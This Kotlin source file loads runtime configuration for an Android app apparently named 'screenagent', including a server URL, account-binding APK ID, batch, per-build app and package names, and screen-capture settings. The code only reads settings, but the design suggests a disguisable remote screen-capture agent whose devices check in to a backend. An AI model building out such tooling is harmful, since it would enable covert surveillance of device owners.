package com.zaka.screenagent

import android.content.Context
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * 运行时配置。
 *
 * 优先级：assets/agent_config.json  >  BuildConfig（编译期注入的默认值）
 *
 * 字段与后台 B 包建包表单一一对应：
 *   域名      -> serverUrl   （和后台通信的地址，B 包就认这一个地址上线）
 *   APP名     -> appName
 *   APK ID    -> apkId       （★ 账户绑定标识，设备上线靠它找到归属账户）
 *   批次      -> batch
 *   包名      -> packageName
 *   构建ID    -> buildId
 */
data class AgentConfig(
    val serverUrl: String,
    val apkId: String,
    val batch: String,
    val buildId: String,
    val appName: String,
    val packageName: String,
    val version: String,
    val captureMaxWidth: Int,
    val captureQuality: Int
) {
    companion object {
        @Volatile
        private var cached: AgentConfig? = null

        fun get(ctx: Context): AgentConfig = cached ?: synchronized(this) {
            cached ?: load(ctx).also { cached = it }
        }

        private fun load(ctx: Context): AgentConfig {
            var serverUrl = BuildConfig.SERVER_URL
            var apkId = BuildConfig.APK_ID
            var batch = BuildConfig.BATCH
            var buildId = BuildConfig.BUILD_ID
            var appName = BuildConfig.APP_NAME_CFG
            var pkg = ctx.packageName
            var version = BuildConfig.VERSION_NAME
            var maxWidth = 540
            var quality = 50

            try {
                ctx.assets.open("agent_config.json").use { ins ->
                    val text = BufferedReader(InputStreamReader(ins, "UTF-8")).readText()
                    val j = JSONObject(text)
                    serverUrl = j.optString("serverUrl", serverUrl)
                    apkId = j.optString("apkId", apkId)
                    batch = j.optString("batch", batch)
                    buildId = j.optString("buildId", buildId)
                    appName = j.optString("appName", appName)
                    pkg = j.optString("packageName", pkg)
                    version = j.optString("version", version)
                    j.optJSONObject("capture")?.let { c ->
                        maxWidth = c.optInt("maxWidth", maxWidth)
                        quality = c.optInt("quality", quality)
                    }
                }
            } catch (_: Throwable) {
                // 读不到就用 BuildConfig 里的编译期值，保证不崩
            }

            return AgentConfig(
                serverUrl = serverUrl,
                apkId = apkId,
                batch = batch,
                buildId = buildId,
                appName = appName,
                packageName = pkg,
                version = version,
                captureMaxWidth = maxWidth,
                captureQuality = quality
            )
        }
    }
}
